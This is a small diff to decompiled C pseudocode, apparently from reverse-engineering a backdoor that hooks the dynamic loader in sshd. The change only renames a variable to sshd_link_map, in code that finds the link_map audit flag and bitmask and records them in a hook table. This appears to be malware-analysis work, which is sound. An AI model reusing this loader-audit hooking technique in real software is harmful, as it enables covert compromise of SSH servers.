@@ -196,7 +196,7 @@ LAB_00104da9:
           if ((insn_ctx.imm_zeroextended < 0x100) &&
              (mask_bits = count_bits(insn_ctx.imm_zeroextended), mask_bits == 1)) {
             hook_table = search_ctx->hooks;
-            audit_flag_slot = data->runtime_data->main_map + *(uint *)&search_ctx->offset_to_match;
+            audit_flag_slot = data->runtime_data->sshd_link_map + *(uint *)&search_ctx->offset_to_match;
             (hook_table->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = audit_flag_slot;
             (hook_table->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)insn_ctx.imm_zeroextended;
             if ((audit_flag_slot->_opaque & insn_ctx.imm_zeroextended) == 0) {
